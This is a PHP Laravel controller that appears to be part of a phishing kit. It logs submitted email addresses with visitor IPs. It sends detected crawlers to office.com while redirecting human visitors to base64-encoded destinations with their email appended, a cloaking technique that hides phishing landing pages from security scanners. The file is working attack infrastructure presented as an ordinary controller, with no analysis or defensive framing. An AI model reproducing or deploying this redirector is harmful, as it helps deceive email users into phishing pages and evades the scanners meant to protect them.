<?php

namespace App\Http\Controllers;

use App\saveEmail;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
use Crawler;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;


    function get_ip() {
        $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

        foreach ($keys as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                        return $ip;
                    }
                }
            }
        }
    }

    public function index(){

        $data = saveEmail::where('ip',request()->ip())->latest()->first();
//        return $data;

        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
//            return base64_decode($data->target).base64_decode($data->email);
            return redirect()->away(base64_decode($data->target).base64_decode($data->email));

        }
    }

    public function index2(Request $request){
        $save = new saveEmail();
        $save->email = $request->subs;
        $save->ip = $this->get_ip();
        $save->target = $request->excode;
        $save->save();
        return "ok";

    }

    public function code($code){
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            $base64 = base64_decode($code);
//            dd($base64);
            return redirect()->away($base64);

        }
    }
}
